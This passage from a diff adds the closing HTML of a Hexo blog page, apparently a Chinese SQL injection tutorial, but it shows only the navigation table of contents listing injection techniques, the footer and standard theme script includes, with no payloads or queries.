class="nav-text">1.常用函数：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-数据库中注释："><span class="nav-number">3.0.0.0.2.</span> <span class="nav-text">2.数据库中注释：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-库名表名字段名"><span class="nav-number">3.0.0.0.3.</span> <span class="nav-text">3.库名表名字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-步骤"><span class="nav-number">3.0.0.0.4.</span> <span class="nav-text">4.步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四-union联合查询注入"><span class="nav-number">4.</span> <span class="nav-text">四.union联合查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-收集信息："><span class="nav-number">4.0.0.0.0.1.</span> <span class="nav-text">1.收集信息：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-获取当前数据库下表名"><span class="nav-number">4.0.0.0.0.2.</span> <span class="nav-text">2.获取当前数据库下表名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-获取当前数据库下指定表的字段名"><span class="nav-number">4.0.0.0.0.3.</span> <span class="nav-text">3.获取当前数据库下指定表的字段名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-获取字段数据"><span class="nav-number">4.0.0.0.0.4.</span> <span class="nav-text">4.获取字段数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五-盲注"><span class="nav-number">5.</span> <span class="nav-text">五.盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于布尔的盲注探测"><span class="nav-number">5.0.0.1.</span> <span class="nav-text">基于布尔的盲注探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">5.0.0.2.</span> <span class="nav-text">基于时间的盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六-报错注入"><span class="nav-number">6.</span> <span class="nav-text">六.报错注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七-宽字节注入"><span class="nav-number">7.</span> <span class="nav-text">七.宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#八-二次解码注入"><span class="nav-number">8.</span> <span class="nav-text">八.二次解码注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#九-二次注入"><span class="nav-number">9.</span> <span class="nav-text">九.二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#十-HTTP头部注入"><span class="nav-number">10.</span> <span class="nav-text">十.HTTP头部注入</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cancrie</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":150,"height":290},"mobile":{"show":true},"log":false});</script></body>
+</html>
